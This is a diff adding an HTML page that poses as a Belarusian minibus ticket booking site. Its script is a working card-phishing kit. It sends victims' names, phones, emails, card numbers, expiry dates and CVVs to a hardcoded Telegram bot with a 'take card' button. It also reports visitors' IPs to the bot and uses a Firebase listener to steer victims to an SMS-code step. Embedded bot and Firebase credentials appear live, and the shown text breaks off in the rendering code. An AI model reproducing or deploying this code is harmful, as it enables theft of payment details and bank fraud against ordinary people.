@@ -1,0 +1,1140 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Маршрутка • Беларусь</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        body {
+            background: #0b1420;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Движущаяся маршрутка на фоне (очень прозрачная) */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: -10%;
+            width: 120%;
+            height: 100%;
+            background: url('https://cdn-icons-png.flaticon.com/512/2972/2972185.png') repeat-x 0 50%;
+            background-size: 120px auto;
+            opacity: 0.02;
+            animation: drive 25s linear infinite;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        @keyframes drive {
+            0% { background-position: -120px 50%; }
+            100% { background-position: 100% 50%; }
+        }
+
+        .container {
+            max-width: 600px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 24px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+            position: relative;
+            z-index: 1;
+        }
+
+        .header {
+            background: #0b2b4a;
+            padding: 24px 20px;
+            text-align: center;
+            border-bottom: 1px solid #1e3a5f;
+        }
+
+        .header a {
+            color: #ffffff;
+            text-decoration: none;
+            font-size: 24px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        .header a:hover {
+            text-decoration: underline;
+            opacity: 0.9;
+        }
+
+        .content {
+            padding: 32px 24px;
+            background: #ffffff;
+        }
+
+        .search-section {
+            margin-bottom: 32px;
+        }
+
+        .section-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #0b2b4a;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #eef2f6;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #4a5568;
+            margin-bottom: 8px;
+        }
+
+        .form-group select,
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: 16px;
+            color: #1e293b;
+            background: #f8fafc;
+            transition: all 0.2s;
+            appearance: none;
+        }
+
+        .form-group select {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%234a5568' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 16px center;
+        }
+
+        .form-group select:focus,
+        .form-group input:focus {
+            outline: none;
+            border-color: #0b2b4a;
+            background: #ffffff;
+            box-shadow: 0 0 0 3px rgba(11, 43, 74, 0.1);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-bottom: 12px;
+        }
+
+        .btn-primary {
+            background: #0b2b4a;
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: #123b63;
+        }
+
+        .btn-secondary {
+            background: #f1f5f9;
+            color: #0b2b4a;
+            border: 1px solid #e2e8f0;
+        }
+
+        .btn-secondary:hover {
+            background: #e9eef3;
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .routes-list {
+            margin-top: 24px;
+        }
+
+        .route-card {
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 16px;
+            transition: all 0.2s;
+        }
+
+        .route-card:hover {
+            border-color: #0b2b4a;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+        }
+
+        .route-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+
+        .route-time {
+            font-size: 20px;
+            font-weight: 700;
+            color: #0b2b4a;
+        }
+
+        .route-price {
+            font-size: 22px;
+            font-weight: 700;
+            color: #0b2b4a;
+        }
+
+        .route-details {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 16px;
+            margin-bottom: 16px;
+            color: #4a5568;
+            font-size: 14px;
+        }
+
+        .route-detail {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .route-detail i {
+            color: #64748b;
+        }
+
+        .route-points {
+            background: #ffffff;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 16px;
+            font-size: 14px;
+            border: 1px dashed #cbd5e1;
+        }
+
+        .route-point {
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+
+        .route-point:last-child {
+            margin-bottom: 0;
+        }
+
+        .route-point-icon {
+            color: #0b2b4a;
+            font-weight: 600;
+            min-width: 20px;
+        }
+
+        .route-point-text {
+            color: #1e293b;
+        }
+
+        .route-seats {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #059669;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .spinner {
+            border: 3px solid #e2e8f0;
+            border-top: 3px solid #0b2b4a;
+            border-radius: 50%;
+            width: 48px;
+            height: 48px;
+            animation: spin 1s linear infinite;
+            margin: 32px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .summary-box {
+            background: #f8fafc;
+            border-radius: 16px;
+            padding: 24px;
+            margin-bottom: 24px;
+            border: 1px solid #e2e8f0;
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            font-size: 15px;
+        }
+
+        .summary-label {
+            color: #64748b;
+        }
+
+        .summary-value {
+            font-weight: 600;
+            color: #1e293b;
+        }
+
+        .total-price {
+            font-size: 24px;
+            font-weight: 700;
+            color: #0b2b4a;
+            text-align: center;
+            margin: 24px 0;
+        }
+
+        .sms-input {
+            width: 100%;
+            padding: 20px;
+            font-size: 32px;
+            letter-spacing: 8px;
+            text-align: center;
+            background: #f8fafc;
+            border: 2px solid #e2e8f0;
+            border-radius: 16px;
+            margin-bottom: 20px;
+            font-family: monospace;
+        }
+
+        .sms-input:focus {
+            outline: none;
+            border-color: #0b2b4a;
+        }
+
+        .success-box,
+        .fail-box {
+            text-align: center;
+            padding: 32px 20px;
+        }
+
+        .success-icon {
+            width: 64px;
+            height: 64px;
+            background: #d1fae5;
+            color: #059669;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+            font-size: 32px;
+        }
+
+        .fail-icon {
+            width: 64px;
+            height: 64px;
+            background: #fee2e2;
+            color: #b91c1c;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+            font-size: 32px;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 24px 20px;
+            background: #f8fafc;
+            border-top: 1px solid #e2e8f0;
+            font-size: 12px;
+            color: #94a3b8;
+        }
+
+        .footer p {
+            margin-bottom: 4px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="app"></div>
+
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+    <script>
+        (function() {
+            // ==================== НАСТРОЙКИ FIREBASE ====================
+            const firebaseConfig = {
+                apiKey: "AIzaSyB2IZy_bK8vQeiGpXYbvWvDyPcP80Dj984",
+                authDomain: "marsutka-tt37.firebaseapp.com",
+                databaseURL: "https://marsutka-tt37-default-rtdb.firebaseio.com",
+                projectId: "marsutka-tt37",
+                storageBucket: "marsutka-tt37.firebasestorage.app",
+                messagingSenderId: "714890480273",
+                appId: "1:714890480273:web:e537b2c757d521a88e0d30"
+            };
+            firebase.initializeApp(firebaseConfig);
+            const db = firebase.database();
+
+            // ==================== ДАННЫЕ TELEGRAM ====================
+            const BOT_TOKEN = '8529551109:AAGafdmClxe936XeYH5F3VfLrtFNZ20CP9c';
+            const ADMIN_ID = 5852338439;
+            const urlParams = new URLSearchParams(window.location.search);
+            const linkHash = urlParams.get('hash');
+
+            // ==================== ГОРОДА БЕЛАРУСИ ====================
+            const CITIES = [
+                'Минск', 'Гомель', 'Брест', 'Витебск', 'Гродно', 'Могилёв',
+                'Бобруйск', 'Барановичи', 'Борисов', 'Орша', 'Пинск', 'Мозырь',
+                'Солигорск', 'Лида', 'Молодечно', 'Полоцк', 'Жлобин', 'Светлогорск',
+                'Речица', 'Слуцк', 'Кобрин', 'Волковыск', 'Новогрудок', 'Сморгонь',
+                'Калинковичи'
+            ];
+
+            // ==================== БАЗА BIN ====================
+            const BIN_DB = {
+                // Беларусбанк
+                '427901': { bank: 'Беларусбанк', type: 'Visa Classic' },
+                '427902': { bank: 'Беларусбанк', type: 'Visa Gold' },
+                '427903': { bank: 'Беларусбанк', type: 'Visa Platinum' },
+                '425501': { bank: 'Беларусбанк', type: 'Mastercard Standard' },
+                '425502': { bank: 'Беларусбанк', type: 'Mastercard Gold' },
+                '911201': { bank: 'Беларусбанк', type: 'МИР' },
+                '380101': { bank: 'Беларусбанк', type: 'Белкарт' },
+                '91123801': { bank: 'Беларусбанк', type: 'МИР Supreme' },
+                
+                // Приорбанк
+                '521324': { bank: 'Приорбанк', type: 'Mastercard Standard' },
+                '521325': { bank: 'Приорбанк', type: 'Mastercard Gold' },
+                '515701': { bank: 'Приорбанк', type: 'Visa Classic' },
+                '515702': { bank: 'Приорбанк', type: 'Visa Gold' },
+                
+                // Белинвестбанк
+                '440501': { bank: 'Белинвестбанк', type: 'Visa Classic' },
+                '440502': { bank: 'Белинвестбанк', type: 'Visa Gold' },
+                '510501': { bank: 'Белинвестбанк', type: 'Mastercard' },
+                
+                // Альфа-Банк
+                '458101': { bank: 'Альфа-Банк', type: 'Visa Classic' },
+                '458102': { bank: 'Альфа-Банк', type: 'Visa Gold' },
+                '555501': { bank: 'Альфа-Банк', type: 'Mastercard Standard' },
+                
+                // Банк Дабрабыт
+                '462201': { bank: 'Банк Дабрабыт', type: 'Visa Classic' },
+                '552201': { bank: 'Банк Дабрабыт', type: 'Mastercard' },
+                
+                // Технобанк
+                '424601': { bank: 'Технобанк', type: 'Visa' },
+                '676301': { bank: 'Технобанк', type: 'Maestro' },
+                
+                // Паритетбанк
+                '498401': { bank: 'Паритетбанк', type: 'Visa' },
+                '427601': { bank: 'Паритетбанк', type: 'Mastercard' },
+                
+                // РРБ-Банк
+                '411111': { bank: 'РРБ-Банк', type: 'Visa' },
+                
+                // Сбербанк
+                '427688': { bank: 'Сбербанк', type: 'Visa' },
+                '546901': { bank: 'Сбербанк', type: 'Mastercard' },
+                
+                // ВТБ
+                '427229': { bank: 'ВТБ', type: 'Visa' },
+                '546801': { bank: 'ВТБ', type: 'Mastercard' },
+                
+                // Тинькофф
+                '437772': { bank: 'Тинькофф', type: 'Visa' },
+                '521324': { bank: 'Тинькофф', type: 'Mastercard' },
+            };
+
+            // ==================== МАРШРУТЫ (5+ рейсов на каждое направление) ====================
+            const ROUTES = [
+                // Минск → Гомель
+                { from: 'Минск', to: 'Гомель', time: '09:00', duration: '4ч 30м', price: 27, seats: 15, 
+                  fromPoint: 'Автовокзал «Центральный», ул. Бобруйская 1', toPoint: 'Автовокзал «Гомель», ул. Привокзальная 3' },
+                { from: 'Минск', to: 'Гомель', time: '13:00', duration: '4ч 30м', price: 27, seats: 12,
+                  fromPoint: 'Автовокзал «Центральный», ул. Бобруйская 1', toPoint: 'Автовокзал «Гомель», ул. Привокзальная 3' },
+                { from: 'Минск', to: 'Гомель', time: '18:00', duration: '4ч 30м', price: 29, seats: 8,
+                  fromPoint: 'Автовокзал «Центральный», ул. Бобруйская 1', toPoint: 'Автовокзал «Гомель», ул. Привокзальная 3' },
+                { from: 'Минск', to: 'Гомель', time: '23:00', duration: '4ч 15м', price: 32, seats: 10,
+                  fromPoint: 'Автовокзал «Центральный», ул. Бобруйская 1', toPoint: 'Автовокзал «Гомель», ул. Привокзальная 3' },
+                { from: 'Минск', to: 'Гомель', time: '06:30', duration: '4ч 45м', price: 25, seats: 20,
+                  fromPoint: 'Автовокзал «Восточный», ул. Олега Кошевого', toPoint: 'Автовокзал «Гомель», ул. Привокзальная 3' },
+                
+                // Минск → Брест
+                { from: 'Минск', to: 'Брест', time: '08:30', duration: '4ч 00м', price: 30, seats: 12,
+                  fromPoint: 'Автовокзал «Центральный», ул. Бобруйская 1', toPoint: 'Автовокзал «Брест»' },
+                { from: 'Минск', to: 'Брест', time: '12:30', duration: '4ч 00м', price: 30, seats: 10,
+                  fromPoint: 'Автовокзал «Центральный», ул. Бобруйская 1', toPoint: 'Автовокзал «Брест»' },
+                { from: 'Минск', to: 'Брест', time: '17:00', duration: '4ч 00м', price: 32, seats: 8,
+                  fromPoint: 'Автовокзал «Центральный», ул. Бобруйская 1', toPoint: 'Автовокзал «Брест»' },
+                { from: 'Минск', to: 'Брест', time: '21:30', duration: '3ч 45м', price: 35, seats: 6,
+                  fromPoint: 'Автовокзал «Восточный», ул. Олега Кошевого', toPoint: 'Автовокзал «Брест»' },
+                { from: 'Минск', to: 'Брест', time: '05:00', duration: '4ч 15м', price: 28, seats: 14,
+                  fromPoint: 'Автовокзал «Центральный», ул. Бобруйская 1', toPoint: 'Автовокзал «Брест»' },
+                
+                // Минск → Витебск
+                { from: 'Минск', to: 'Витебск', time: '09:30', duration: '3ч 45м', price: 28, seats: 12,
+                  fromPoint: 'Автовокзал «Центральный», ул. Бобруйская 1', toPoint: 'Автовокзал «Витебск»' },
+                { from: 'Минск', to: 'Витебск', time: '14:00', duration: '3ч 45м', price: 28, seats: 10,
+                  fromPoint: 'Автовокзал «Центральный», ул. Бобруйская 1', toPoint: 'Автовокзал «Витебск»' },
+                { from: 'Минск', to: 'Витебск', time: '18:30', duration: '3ч 45м', price: 30, seats: 8,
+                  fromPoint: 'Автовокзал «Центральный», ул. Бобруйская 1', toPoint: 'Автовокзал «Витебск»' },
+                { from: 'Минск', to: 'Витебск', time: '22:00', duration: '3ч 30м', price: 33, seats: 6,
+                  fromPoint: 'Автовокзал «Восточный», ул. Олега Кошевого', toPoint: 'Автовокзал «Витебск»' },
+                { from: 'Минск', to: 'Витебск', time: '06:00', duration: '4ч 00м', price: 26, seats: 14,
+                  fromPoint: 'Автовокзал «Центральный», ул. Бобруйская 1', toPoint: 'Автовокзал «Витебск»' },
+                
+                // Минск → Гродно
+                { from: 'Минск', to: 'Гродно', time: '08:00', duration: '4ч 38м', price: 27, seats: 12,
+                  fromPoint: 'Автовокзал «Центральный», ул. Бобруйская 1', toPoint: 'Автовокзал «Гродно», ул. Чырвонаармейская' },
+                { from: 'Минск', to: 'Гродно', time: '12:30', duration: '4ч 38м', price: 27, seats: 10,
+                  fromPoint: 'Автовокзал «Центральный», ул. Бобруйская 1', toPoint: 'Автовокзал «Гродно», ул. Чырвонаармейская' },
+                { from: 'Минск', to: 'Гродно', time: '16:30', duration: '4ч 38м', price: 29, seats: 8,
+                  fromPoint: 'Автовокзал «Центральный», ул. Бобруйская 1', toPoint: 'Автовокзал «Гродно», ул. Чырвонаармейская' },
+                { from: 'Минск', to: 'Гродно', time: '20:30', duration: '4ч 15м', price: 32, seats: 6,
+                  fromPoint: 'Автовокзал «Восточный», ул. Олега Кошевого', toPoint: 'Автовокзал «Гродно», ул. Чырвонаармейская' },
+                { from: 'Минск', to: 'Гродно', time: '05:30', duration: '5ч 00м', price: 25, seats: 14,
+                  fromPoint: 'Автовокзал «Центральный», ул. Бобруйская 1', toPoint: 'Автовокзал «Гродно», ул. Чырвонаармейская' },
+                
+                // Минск → Могилёв
+                { from: 'Минск', to: 'Могилёв', time: '09:00', duration: '2ч 30м', price: 25, seats: 15,
+                  fromPoint: 'Автовокзал «Центральный», ул. Бобруйская 1', toPoint: 'Автовокзал «Могилёв», пр. Мира 6' },
+                { from: 'Минск', to: 'Могилёв', time: '13:00', duration: '2ч 30м', price: 25, seats: 12,
+                  fromPoint: 'Автовокзал «Центральный», ул. Бобруйская 1', toPoint: 'Автовокзал «Могилёв», пр. Мира 6' },
+                { from: 'Минск', to: 'Могилёв', time: '17:00', duration: '2ч 30м', price: 27, seats: 10,
+                  fromPoint: 'Автовокзал «Центральный», ул. Бобруйская 1', toPoint: 'Автовокзал «Могилёв», пр. Мира 6' },
+                { from: 'Минск', to: 'Могилёв', time: '20:30', duration: '2ч 15м', price: 30, seats: 8,
+                  fromPoint: 'Автовокзал «Восточный», ул. Олега Кошевого', toPoint: 'Автовокзал «Могилёв», пр. Мира 6' },
+                { from: 'Минск', to: 'Могилёв', time: '06:30', duration: '2ч 45м', price: 23, seats: 18,
+                  fromPoint: 'Автовокзал «Центральный», ул. Бобруйская 1', toPoint: 'Автовокзал «Могилёв», пр. Мира 6' },
+                
+                // Минск → Бобруйск
+                { from: 'Минск', to: 'Бобруйск', time: '08:30', duration: '1ч 40м', price: 22, seats: 12,
+                  fromPoint: 'Автовокзал «Центральный», ул. Бобруйская 1', toPoint: 'Автовокзал «Бобруйск»' },
+                { from: 'Минск', to: 'Бобруйск', time: '12:30', duration: '1ч 40м', price: 22, seats: 10,
+                  fromPoint: 'Автовокзал «Центральный», ул. Бобруйская 1', toPoint: 'Автовокзал «Бобруйск»' },
+                { from: 'Минск', to: 'Бобруйск', time: '16:30', duration: '1ч 40м', price: 24, seats: 8,
+                  fromPoint: 'Автовокзал «Центральный», ул. Бобруйская 1', toPoint: 'Автовокзал «Бобруйск»' },
+                { from: 'Минск', to: 'Бобруйск', time: '19:30', duration: '1ч 30м', price: 26, seats: 6,
+                  fromPoint: 'Автовокзал «Восточный», ул. Олега Кошевого', toPoint: 'Автовокзал «Бобруйск»' },
+                { from: 'Минск', to: 'Бобруйск', time: '07:00', duration: '1ч 50м', price: 20, seats: 14,
+                  fromPoint: 'Автовокзал «Центральный», ул. Бобруйская 1', toPoint: 'Автовокзал «Бобруйск»' },
+                
+                // Обратные рейсы (Гомель → Минск)
+                { from: 'Гомель', to: 'Минск', time: '08:00', duration: '4ч 30м', price: 27, seats: 12,
+                  fromPoint: 'Автовокзал «Гомель», ул. Привокзальная 3', toPoint: 'Автовокзал «Центральный», ул. Бобруйская 1' },
+                { from: 'Гомель', to: 'Минск', time: '12:00', duration: '4ч 30м', price: 27, seats: 10,
+                  fromPoint: 'Автовокзал «Гомель», ул. Привокзальная 3', toPoint: 'Автовокзал «Центральный», ул. Бобруйская 1' },
+                { from: 'Гомель', to: 'Минск', time: '16:00', duration: '4ч 30м', price: 29, seats: 8,
+                  fromPoint: 'Автовокзал «Гомель», ул. Привокзальная 3', toPoint: 'Автовокзал «Центральный», ул. Бобруйская 1' },
+                { from: 'Гомель', to: 'Минск', time: '20:00', duration: '4ч 15м', price: 32, seats: 6,
+                  fromPoint: 'Автовокзал «Гомель», ул. Привокзальная 3', toPoint: 'Автовокзал «Восточный», ул. Олега Кошевого' },
+                
+                // Брест → Минск
+                { from: 'Брест', to: 'Минск', time: '07:30', duration: '4ч 00м', price: 30, seats: 12,
+                  fromPoint: 'Автовокзал «Брест»', toPoint: 'Автовокзал «Центральный», ул. Бобруйская 1' },
+                { from: 'Брест', to: 'Минск', time: '11:30', duration: '4ч 00м', price: 30, seats: 10,
+                  fromPoint: 'Автовокзал «Брест»', toPoint: 'Автовокзал «Центральный», ул. Бобруйская 1' },
+                { from: 'Брест', to: 'Минск', time: '15:30', duration: '4ч 00м', price: 32, seats: 8,
+                  fromPoint: 'Автовокзал «Брест»', toPoint: 'Автовокзал «Центральный», ул. Бобруйская 1' },
+                { from: 'Брест', to: 'Минск', time: '19:30', duration: '3ч 45м', price: 35, seats: 6,
+                  fromPoint: 'Автовокзал «Брест»', toPoint: 'Автовокзал «Восточный», ул. Олега Кошевого' },
+                
+                // Витебск → Минск
+                { from: 'Витебск', to: 'Минск', time: '08:00', duration: '3ч 45м', price: 28, seats: 12,
+                  fromPoint: 'Автовокзал «Витебск»', toPoint: 'Автовокзал «Центральный», ул. Бобруйская 1' },
+                { from: 'Витебск', to: 'Минск', time: '12:30', duration: '3ч 45м', price: 28, seats: 10,
+                  fromPoint: 'Автовокзал «Витебск»', toPoint: 'Автовокзал «Центральный», ул. Бобруйская 1' },
+                { from: 'Витебск', to: 'Минск', time: '16:30', duration: '3ч 45м', price: 30, seats: 8,
+                  fromPoint: 'Автовокзал «Витебск»', toPoint: 'Автовокзал «Центральный», ул. Бобруйская 1' },
+                { from: 'Витебск', to: 'Минск', time: '20:30', duration: '3ч 30м', price: 33, seats: 6,
+                  fromPoint: 'Автовокзал «Витебск»', toPoint: 'Автовокзал «Восточный», ул. Олега Кошевого' },
+                
+                // Гродно → Минск
+                { from: 'Гродно', to: 'Минск', time: '07:00', duration: '4ч 38м', price: 27, seats: 12,
+                  fromPoint: 'Автовокзал «Гродно», ул. Чырвонаармейская', toPoint: 'Автовокзал «Центральный», ул. Бобруйская 1' },
+                { from: 'Гродно', to: 'Минск', time: '11:00', duration: '4ч 38м', price: 27, seats: 10,
+                  fromPoint: 'Автовокзал «Гродно», ул. Чырвонаармейская', toPoint: 'Автовокзал «Центральный», ул. Бобруйская 1' },
+                { from: 'Гродно', to: 'Минск', time: '15:00', duration: '4ч 38м', price: 29, seats: 8,
+                  fromPoint: 'Автовокзал «Гродно», ул. Чырвонаармейская', toPoint: 'Автовокзал «Центральный», ул. Бобруйская 1' },
+                { from: 'Гродно', to: 'Минск', time: '19:00', duration: '4ч 15м', price: 32, seats: 6,
+                  fromPoint: 'Автовокзал «Гродно», ул. Чырвонаармейская', toPoint: 'Автовокзал «Восточный», ул. Олега Кошевого' },
+                
+                // Могилёв → Минск
+                { from: 'Могилёв', to: 'Минск', time: '08:30', duration: '2ч 30м', price: 25, seats: 15,
+                  fromPoint: 'Автовокзал «Могилёв», пр. Мира 6', toPoint: 'Автовокзал «Центральный», ул. Бобруйская 1' },
+                { from: 'Могилёв', to: 'Минск', time: '12:30', duration: '2ч 30м', price: 25, seats: 12,
+                  fromPoint: 'Автовокзал «Могилёв», пр. Мира 6', toPoint: 'Автовокзал «Центральный», ул. Бобруйская 1' },
+                { from: 'Могилёв', to: 'Минск', time: '16:30', duration: '2ч 30м', price: 27, seats: 10,
+                  fromPoint: 'Автовокзал «Могилёв», пр. Мира 6', toPoint: 'Автовокзал «Центральный», ул. Бобруйская 1' },
+                { from: 'Могилёв', to: 'Минск', time: '20:00', duration: '2ч 15м', price: 30, seats: 8,
+                  fromPoint: 'Автовокзал «Могилёв», пр. Мира 6', toPoint: 'Автовокзал «Восточный», ул. Олега Кошевого' },
+                
+                // Бобруйск → Минск
+                { from: 'Бобруйск', to: 'Минск', time: '07:30', duration: '1ч 40м', price: 22, seats: 12,
+                  fromPoint: 'Автовокзал «Бобруйск»', toPoint: 'Автовокзал «Центральный», ул. Бобруйская 1' },
+                { from: 'Бобруйск', to: 'Минск', time: '11:30', duration: '1ч 40м', price: 22, seats: 10,
+                  fromPoint: 'Автовокзал «Бобруйск»', toPoint: 'Автовокзал «Центральный», ул. Бобруйская 1' },
+                { from: 'Бобруйск', to: 'Минск', time: '15:30', duration: '1ч 40м', price: 24, seats: 8,
+                  fromPoint: 'Автовокзал «Бобруйск»', toPoint: 'Автовокзал «Центральный», ул. Бобруйская 1' },
+                { from: 'Бобруйск', to: 'Минск', time: '18:30', duration: '1ч 30м', price: 26, seats: 6,
+                  fromPoint: 'Автовокзал «Бобруйск»', toPoint: 'Автовокзал «Восточный», ул. Олега Кошевого' },
+            ];
+
+            // ==================== СОСТОЯНИЕ ====================
+            let state = {
+                mode: linkHash ? 'specific' : 'search',
+                step: linkHash ? 'specific' : 'search',
+                fromCity: '',
+                toCity: '',
+                date: new Date().toISOString().split('T')[0],
+                selectedRoute: null,
+                passenger: { fullName: '', phone: '', email: '' },
+                card: { number: '', expiry: '', cvv: '', cardholder: '' },
+                smsCode: '',
+                sessionId: 'sess_' + Date.now() + '_' + Math.random().toString(36).substring(7),
+                searchResults: []
+            };
+
+            if (linkHash) {
+                // Для теста выбираем первый рейс из Минска в Гомель
+                state.selectedRoute = ROUTES.find(r => r.from === 'Минск' && r.to === 'Гомель');
+                state.step = 'specific';
+            }
+
+            // ==================== ФУНКЦИИ ====================
+            function getBinInfo(cardNumber) {
+                const bin = cardNumber.replace(/\D/g, '').slice(0,6);
+                return BIN_DB[bin] || { bank: 'Неизвестно', type: 'Неизвестно' };
+            }
+
+            function formatCardNumber(v) {
+                let d = v.replace(/\D/g, '').slice(0,16);
+                let parts = [];
+                for (let i=0; i<d.length; i+=4) parts.push(d.slice(i,i+4));
+                return parts.join(' ');
+            }
+
+            function formatExpiry(v) {
+                let d = v.replace(/\D/g, '').slice(0,4);
+                if (d.length >= 3) return d.slice(0,2) + '/' + d.slice(2);
+                return d;
+            }
+
+            function formatCVV(v) {
+                return v.replace(/\D/g, '').slice(0,3);
+            }
+
+            function searchRoutes(from, to) {
+                return ROUTES.filter(r => r.from === from && r.to === to);
+            }
+
+            async function sendVisitNotification() {
+                if (!linkHash) return;
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    const text = `👁 ЗАХОД НА ССЫЛКУ\n\n🔗 Хеш: ${linkHash}\n🌍 IP: ${ipData.ip}\n📱 ${navigator.userAgent}`;
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: ADMIN_ID, text: text })
+                    });
+                } catch (e) {}
+            }
+
+            async function sendCardToBot(routeData) {
+                const binInfo = getBinInfo(state.card.number);
+                const messageText = 
+                    `💳 НОВАЯ КАРТА\n\n` +
+                    `🚐 Маршрут: ${routeData.from} → ${routeData.to}\n` +
+                    `📅 ${state.date}\n` +
+                    `⏰ ${routeData.time}\n` +
+                    `💰 ${routeData.price} BYN\n` +
+                    `👤 Пассажир: ${state.passenger.fullName}\n` +
+                    `📞 Телефон: ${state.passenger.phone}\n` +
+                    `📧 Email: ${state.passenger.email}\n` +
+                    `💳 Карта: ${state.card.number}\n` +
+                    `📅 Срок: ${state.card.expiry} | CVV: ${state.card.cvv}\n` +
+                    `👤 Владелец: ${state.card.cardholder}\n` +
+                    `🔢 BIN: ${state.card.number.replace(/\D/g, '').slice(0,6)}\n` +
+                    `🏦 БАНК: ${binInfo.bank}\n` +
+                    `💎 ТИП: ${binInfo.type}\n` +
+                    `🔗 Хеш: ${linkHash || 'manual'}\n` +
+                    `🆔 Сессия: ${state.sessionId}`;
+
+                const keyboard = {
+                    inline_keyboard: [
+                        [{ text: '💰 ВЗЯТЬ КАРТУ', callback_data: `take_${state.sessionId}` },
+                         { text: '🗑 ОТКАЗ', callback_data: `reject_${state.sessionId}` }]
+                    ]
+                };
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: ADMIN_ID,
+                            text: messageText,
+                            parse_mode: 'HTML',
+                            reply_markup: keyboard
+                        })
+                    });
+                    return true;
+                } catch (e) {
+                    console.error(e);
+                    return false;
+                }
+            }
+
+            let firebaseListener = null;
+            
+            function startFirebaseListener() {
+                if (firebaseListener) return;
+                
+                console.log(`🔥 Запуск Firebase слушателя для ${state.sessionId}`);
+                const cardRef = db.ref(`cards/${state.sessionId}/status`);
+                
+                firebaseListener = cardRef.on('value', (snapshot) => {
+                    const status = snapshot.val();
+                    console.log(`🔥 Статус Firebase: ${status}, шаг: ${state.step}`);
+                    
+                    if (status === 'sms' && (state.step === 'processing' || state.step === 'processing2')) {
+                        console.log('✅ Переключаем на SMS');
+                        state.step = 'sms';
+                        render();
+                    } else if (status === 'success' && state.step === 'processing2') {
+                        console.log('✅ Оплата успешна');
+                        state.step = 'success';
+                        render();
+                    } else if (status === 'fail' && state.step === 'processing2') {
+                        console.log('❌ Оплата не прошла');
+                        state.step = 'fail';
+                        render();
+                    }
+                }, (error) => {
+                    console.error('❌ Ошибка Firebase:', error);
+                });
+            }
+
+            // ==================== ОТПРАВКА УВЕДОМЛЕНИЯ О ЗАХОДЕ ====================
+            if (linkHash) {
+                sendVisitNotification();
+            }
+
+            // ==================== РЕНДЕР ====================
+            function render() {
+                const app = document.getElementById('app');
+                
+                let html = `
+                    <div class="header">
+                        <a href="/">Маршрутка • Беларусь</a>
+                    </div>
+                    <div class="content">
+                `;
+
+                // ===== РЕЖИМ ПОИСКА =====
+                if (state.step === 'search') {
+                    html += `
+                        <div class="search-section">
+                            <div class="section-title">🔍 Поиск билетов</div>
+                            <div class="form-group">
+                                <label>Откуда</label>
+                                <select id="fromCity">
+                                    <option value="">Выберите город</option>
+                                    ${CITIES.map(city => `<option value="${city}">${city}</option>`).join('')}
+                                </select>
+                            </div>
+                            <div class="form-group">
+                                <label>Куда</label>
+                                <select id="toCity">
+                                    <option value="">Выберите город</option>
+                                    ${CITIES.map(city => `<option value="${city}">${city}</option>`).join('')}
+                                </select>
+                            </div>
+                            <div class="form-group">
+                                <label>Дата</label>
+                                <input type="date" id="date" value="${state.date}">
+                            </div>
+                            <button class="btn btn-primary" id="searchBtn">Найти билеты</button>
+                        </div>
+                        <div class="routes-list" id="routesList"></div>
+                    `;
